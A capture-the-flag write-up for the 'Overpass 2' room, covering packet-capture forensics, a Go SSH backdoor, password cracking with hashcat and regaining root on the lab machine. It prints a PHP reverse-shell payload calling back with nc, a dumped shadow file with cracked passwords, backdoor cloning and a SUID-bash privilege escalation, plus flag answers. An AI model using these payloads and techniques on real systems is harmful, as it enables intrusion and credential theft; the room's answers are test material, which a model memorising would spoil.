---
title: Overpass2
tags: [room]

---



# Overpass 2

## PCAP analysis
### Fist flag
First of all we download the pcap file and lets analyze.
The first question is 
> What was the URL of the page they used to upload a reverse shell?

In the first stream of the packet we can see something...
``` p
POST /development/upload.php HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.170.159/development/
Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006
Content-Length: 454
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

We can see a refered page called `/dev***pment/` This si the url of the page they used to upload a reverse shell.

### Second flag
> What payload did the attacker use to gain access?
in the second stream 
```
Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
Content-Type: application/x-php

<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="submit"

Upload File
```
we can see that the atacker used a payload for a reverse shell to 192.168.170.145.
that is to say, The payload used is

`<?php **********************************************************************************/tmp/f")?>`

### Third flag

> What password did the attacker use to privesc?

The fast answer to this question is in the 3 stream. in this packet we can see that the attacker used a password to enter to james
```
 su james
Password: 
whenevernoteartinstant
```
**How did the attacker know the password?**

the attacker saw a file called `.overpass` in uploads 

```
cat .overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN.www-data@overpass-production:/var/www/html/development/uploads$ 
```
exist a a rare text (`,LQ?2>6QiQ$JDE6>Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN.`), this part seems to be a encrypted code or text.
I found that the rare text is  a rot47 code message, let's decode :
```
[{"name":"System","pass":"whenevernoteartinstant"}]
```
Bingo

### Four flag

> How did the attacker establish persistence?
```
james@overpass-production:~$ 
git clone https://github.com/NinjaJc01/ssh-backdoor
```
The attacker put a ssh backdoor in the 

### Five flag
The atacker from the james user, saw tha `/etc/shadow` were exist various encrypted password for various users.
```
cat /etc/shadow
....
....

 james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```
the encrypted password for james,paradox,szymex,bee,muirland are exposed.
We used [fasttrack](https://github.com/drtychai/wordlists/blob/master/fasttrack.txt) to see what password are vulnerable to a brute force attack with this wordlist

lets cracking use hashcat:
``` go
 maysu@Maysus-MacBook-Air tmp.D4uy6soXf9 % hashcat -m 1800 -a 0 -o output.txt a fasttrack.txt                             
hashcat (v6.2.6) starting



Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 5 digests; 5 unique digests, 5 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Uses-64-Bit

Dictionary cache built:
* Filename..: fasttrack.txt
* Passwords.: 223
* Bytes.....: 2015
* Keyspace..: 223
* Runtime...: 0 secs
                 
                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: a
Time.Started.....: Mon Oct  7 00:18:12 2024 (3 secs)
Time.Estimated...: Mon Oct  7 00:18:15 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (fasttrack.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       25 H/s (0.35ms) @ Accel:4096 Loops:2 Thr:32 Vec:1
Speed.#2.........:      394 H/s (0.27ms) @ Accel:256 Loops:128 Thr:256 Vec:1
Speed.#*.........:      418 H/s
Recovered........: 4/5 (80.00%) Digests (total), 4/5 (80.00%) Digests (new), 4/5 (80.00%) Salts
Progress.........: 1115/1115 (100.00%)
Rejected.........: 0/1115 (0.00%)
Restore.Point....: 32/223 (14.35%)
Restore.Sub.#1...: Salt:4 Amplifier:0-1 Iteration:4998-5000
Restore.Sub.#2...: Salt:4 Amplifier:0-1 Iteration:4992-5000
Candidate.Engine.: Device Generator
Candidates.#1....: Spring2017 -> Winter2016
Candidates.#2....: Winter2015 -> starwars
Hardware.Mon.#1..: Util:100%
Hardware.Mon.#2..: Util: 23%

Started: Mon Oct  7 00:18:00 2024
Stopped: Mon Oct  7 00:18:17 2024
```

We can see that 4/5 password are recovered using the fasttrack wordlist
which are
```json
maysu@Maysus-MacBook-Air tmp.D4uy6soXf9 % cat output.txt 
$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:secret12
$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:secuirty3
$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:1qaz2wsx
$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:abcd123
```
>Using the fasttrack wordlist, how many of the system passwords were crackable?

## Analyze the backdoor
### the first flag


The first thing i did was clone the backdoor and when i saw a file called backdoor i extracted the hash but this isnt the answer.
When i saw the code of the backdoor
``` go
[pablo@pablo ssh-backdoor]$ cat main.go 
package main

import (
	"crypto/sha512"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os/exec"

	"github.com/creack/pty"
	"github.com/gliderlabs/ssh"
	"github.com/integrii/flaggy"
	gossh "golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
)

var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"

....
```
So 
> What is the hash of the original backdoor
 
This is in go in the `variable` variable
### Second flag
in the`passwordHandler` function we can see another function called verifPass 
```go
func passwordHandler(_ ssh.Context, password string) bool {
	return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
}
```
We can see that the second parameter of the `verifypass` function is the `1c362db832f3f864c8c2fe05f2002a05`. That is the salt because when the verifypass function is defined the second parameter is called salt
```go
func verifyPass(hash, salt, password string) bool {
	resultHash := hashPassword(password, salt)
	return resultHash == hash
}
```

### Third flag
back to where we were. Seeing the pcap file. In the third stream  we can see 
```
james@overpass-production:~/ssh-backdoor$ 
./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```
This is a hash but if we see the go program we can see
```
flaggy.String(&hash, "a", "hash", "Hash for backdoor")
```
this meaning is the hash for the backdoor

### Four flag

If we see the code of the go program we can see ths hash is salted.
> `hashPassword(password, salt)`

so if we see the type of hash in hashcat examples we seee that the code for sha512 salted is in the form of the hashpassword 
`1710 	sha512($pass.$salt)`
Lets se hashcat!
```
hashcat -m 1710 -a 0 -o output.txt a rockyou.txt
```

then 
```
cat output.txt 
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
```

## Attack!
### First flag
>The attacker defaced the website. What message did they leave as a heading?

Lets start the maquine and access to the ip via http 
![image alt](https://i.imgur.com/p7Ai8Vw.png)

we found the first flag!
### Second flag
>Using the information you've found previously, hack your way back in!

We know that the attacker installed a backdoor in the machine, then we can use the password of the hash and the port that we know to enter to the machine using ssh and the port exposed in the main.go
### Third flag
When 
james@overpass-production:/home/james/ssh-backdoor$ cd ..
james@overpass-production:/home/james$ ls
ssh-backdoor  user.txt  www
james@overpass-production:/home/james$ cat user.txt 
thm{d119*******97ddb0525f7ad200e6567}

### Four flag

If we explore we can see and ssuid on the james folder
```
james@overpass-production:/home/james$ ls -la
total 1136
drwxr-xr-x 7 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
-rw------- 1 james james      51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james    4096 Jul 21  2020 www
```

the `.suid_bash` if we executed normal still with the user james. But if we executed with the -d option, send us a privileged shell 
```
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# cat /root/root.txt 
thm{d53b2684f169360bb9606c333873144d}
.suid_bash-4.4# exit

```